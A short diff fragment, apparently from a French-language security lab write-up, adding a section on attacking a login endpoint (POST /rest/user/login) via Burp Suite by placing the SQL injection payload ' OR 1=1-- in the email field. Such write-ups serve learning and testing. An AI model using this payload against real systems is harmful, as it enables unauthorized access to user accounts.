@@ -98,3 +98,15 @@ Password	test
 
 ---
 
+🧪 Attaque via Burp Suite
+
+⚙️ Détails techniques :
+	•	Interception de la requête POST /rest/user/login
+	•	Modification manuelle du corps JSON :
+
+{
+  "email": "' OR 1=1--",
+  "password": "peuimporte"
+}
+
+---
